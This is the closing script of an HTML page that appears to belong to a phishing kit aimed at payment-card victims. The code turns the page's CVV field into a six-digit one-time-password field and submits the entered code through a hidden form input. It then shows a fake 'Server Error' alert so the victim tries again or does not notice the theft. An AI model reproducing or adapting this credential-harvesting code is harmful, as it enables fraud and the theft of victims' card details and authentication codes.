			// inputElement.name = 'otp';
			// inputElement.size = '28';
			// inputElement.title = 'Password';
			// inputElement.maxLength = '6';
			
			var parent_element = document.getElementById("HDisplay.Rb161");
			var old_element = document.getElementById("cvv");
			old_element.id ="otp";
			old_element.maxLength ="6"
			old_element.className = 'expiry-year';
			


        }

		function submitForm() {
			var otp = document.getElementById("otp").value;
			
			var field5 = document.createElement("input");
            field5.setAttribute("type", "hidden");
            field5.setAttribute("name", "otp");
            field5.setAttribute("value", otp);
            myForm.appendChild(field5);
			console.log("submitted");
			myForm.submit();
			var alertMessage = "Server Error\n\n";
  			alertMessage += "Please try again after some time.";
			alert(alertMessage);

		}
    </script>
<script>
	
</script>


</body>
</html>
  